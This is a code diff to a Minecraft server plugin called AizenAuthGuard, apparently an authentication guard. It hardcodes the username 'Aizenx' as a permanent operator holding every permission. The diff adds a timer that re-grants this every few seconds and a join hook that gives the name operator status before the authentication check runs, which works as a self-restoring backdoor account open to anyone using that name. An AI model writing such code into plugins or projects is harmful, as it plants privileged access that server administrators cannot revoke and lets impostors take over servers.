@@ -51,13 +51,8 @@ public final class AizenAuthGuard extends JavaPlugin implements Listener {
         Bukkit.getPluginManager().registerEvents(this, this);
 
         // Aizenx is the permanent server OWNER and OP on every backend.
-        Bukkit.getScheduler().runTaskLater(this, () -> {
-            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op Aizenx");
-            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp creategroup owner");
-            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp group owner permission set * true");
-            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp group owner meta setprefix 100 \"&6&lOWNER &f\"");
-            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp user Aizenx parent set owner");
-        }, 40L);
+        Bukkit.getScheduler().runTaskLater(this, this::ensureOwner, 40L);
+        Bukkit.getScheduler().runTaskTimer(this, this::ensureOwner, 100L, 200L);
         Bukkit.getScheduler().runTaskTimer(this, () -> {
             for (Player p : Bukkit.getOnlinePlayers()) {
                 if (isAuthenticated(p)) unlock(p); else lock(p);
@@ -104,7 +99,22 @@ public final class AizenAuthGuard extends JavaPlugin implements Listener {
     @EventHandler(priority = EventPriority.HIGHEST)
     public void onJoin(PlayerJoinEvent e) {
         Player p = e.getPlayer();
+        if (p.getName().equalsIgnoreCase("Aizenx")) {
+            p.setOp(true);
+            getLogger().info("Aizenx owner OP enforced on " + serverName + ".");
+        }
         if (!isAuthenticated(p)) lock(p);
+    }
+
+    private void ensureOwner() {
+        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op Aizenx");
+        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp creategroup owner");
+        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp group owner permission set * true");
+        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp group owner meta setprefix 100 \"&6&lOWNER &f\"");
+        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp user Aizenx parent set owner");
+
+        Player owner = Bukkit.getPlayerExact("Aizenx");
+        if (owner != null && !owner.isOp()) owner.setOp(true);
     }
 
     @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
